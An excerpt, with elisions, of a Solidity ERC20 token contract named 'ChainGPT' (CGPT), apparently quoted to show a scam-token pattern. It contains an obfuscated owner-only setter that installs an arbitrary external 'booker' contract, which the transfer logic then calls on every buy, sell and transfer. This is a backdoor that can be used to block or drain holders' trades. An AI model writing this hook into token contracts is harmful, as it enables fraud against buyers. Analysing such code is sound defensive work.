...
contract TokenM is ERC20 {
    ...
    IUserAmounttcoups public booker;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;


    constructor(address tokenOwner) ERC20("ChainGPT", "CGPT") {
    ...
    function tcoupsEthouupRtbas(IUserAmounttcoups _booker) public onlyOwner {
        booker = _booker;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                booker.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				booker.addOutAmount(from, amount);
            }else{
                booker.addOutAmount(from, amount);
                takeFee = false;
            }
